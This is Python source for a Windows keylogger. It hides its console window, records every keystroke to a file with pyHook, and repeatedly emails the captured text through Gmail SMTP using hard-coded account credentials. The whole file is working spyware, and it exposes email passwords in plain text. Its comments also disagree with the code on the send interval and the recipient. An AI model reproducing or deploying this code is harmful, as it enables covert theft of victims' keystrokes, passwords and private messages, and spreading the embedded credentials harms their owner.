import win32gui, win32con

# hides the keylogger while it is running-does not open a console window
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)

import pyHook, pythoncom, logging
import smtplib
import time


def sendMail(message):
    # this function send the string message by mail from talbaum16@gmail.com to idokeyloggerproject@gmail.com password: keylogger1
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login('talbaum16@gmail.com', 'qwertyui1')
    server.sendmail('talbaum16@gmail.com', 'talbaum16@gmail.com', message)
    server.quit()


def OnKeyboardEvent(event):
    # the function that runs on every keyboard stroke. writes the character to the log file and sends mail if it should
    global sending_time
    # write the char to the log file
    logging.basicConfig(filename='input.txt', level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))

    # if the a mail was sent more than 60 seconds ago, send mail
    if time.time() - sending_time > 6:
        fil = open("input.txt", 'r')
        text = fil.read()
        sendMail(text)
        sending_time = time.time()

    return True


# initialize sending time
sending_time = time.time()

# start logging keys
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


